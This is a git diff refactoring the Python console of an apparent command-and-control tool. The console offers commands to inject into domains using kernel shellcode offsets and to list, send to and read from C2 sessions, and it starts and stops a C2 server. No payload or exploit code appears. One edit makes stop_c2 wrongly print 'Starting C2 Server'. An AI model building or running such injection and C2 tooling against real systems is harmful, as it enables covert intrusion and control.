@@ -51,7 +51,7 @@ def dominject(_config, _offsets, _args):
     if len(_args) > 0:
         domain = _args[0]
         try:
-            inject_domain(domain, config, offsets)
+            inject_domain(domain, _config, _offsets)
         except InvalidDomain:
             print("Invalid domain")
         except InvalidSyscall:
@@ -63,7 +63,7 @@ def dominject(_config, _offsets, _args):
 
 
 def domlist(_config, _offsets, _args):
-    domains = list_domains(config)
+    domains = list_domains(_config)
     print(", ".join(domains))
 
 
@@ -92,8 +92,7 @@ def modconf(_config, _offsets, _args):
         print("You must provide 'conf_parameter' and 'new_value' arguments")
 
 
-def command_line_interface(config, offsets):
-    server = start_c2(config)
+def command_line_interface(_config, _offsets, stream_req_handler=None):
     options = ["domlist", "dominject", "c2list", "c2send", "c2read", "showconf", "modconf",
                "quit", "help", "info"]
     funcs = {'domlist': domlist, 'dominject': dominject, 'c2list': c2list, 'c2send': c2send,
@@ -118,7 +117,6 @@ def command_line_interface(config, offsets):
         if choice == 'help':
             print(f"Available commands: {', '.join(options)}")
         elif choice == 'quit':
-            print("Bye bye, C2 server will be stopped")
             break
         else:
             choice = choice.split(' ')
@@ -135,22 +133,25 @@ def command_line_interface(config, offsets):
             elif option not in funcs:
                 print("Invalid command")
             else:
-                funcs[option](config, offsets, choice[1:])
-    stop_c2(server)
+                funcs[option](_config, _offsets, choice[1:])
 
 
-def start_c2(config):
+def start_c2(_config):
     print('[+] Starting C2 Server')
-    server = start_multithreaded_c2(config)
+    _server = start_multithreaded_c2(_config)
     print('[+] Done')
-    return server
+    return _server
 
 
-def stop_c2(server):
-    server.shutdown()
+def stop_c2(_server):
+    print('[+] Starting C2 Server')
+    _server.shutdown()
+    print('[+] Done')
 
 
 if __name__ == "__main__":
     config = read_config('/usr/src/app/config/config.json')
     offsets = read_config('/usr/src/app/kernel_shellcode_library/offsets.json')
+    server = start_c2(config)
     command_line_interface(config, offsets)
+    stop_c2(server)
